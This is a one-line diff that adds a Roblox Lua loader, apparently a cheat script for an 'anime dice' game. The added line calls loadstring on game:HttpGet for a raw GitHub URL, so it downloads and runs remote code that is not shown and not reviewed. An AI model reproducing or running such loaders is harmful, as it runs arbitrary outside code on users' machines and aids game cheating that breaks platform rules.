@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/anime-dice-spam1-til67kh6gyoz93.lua"))()
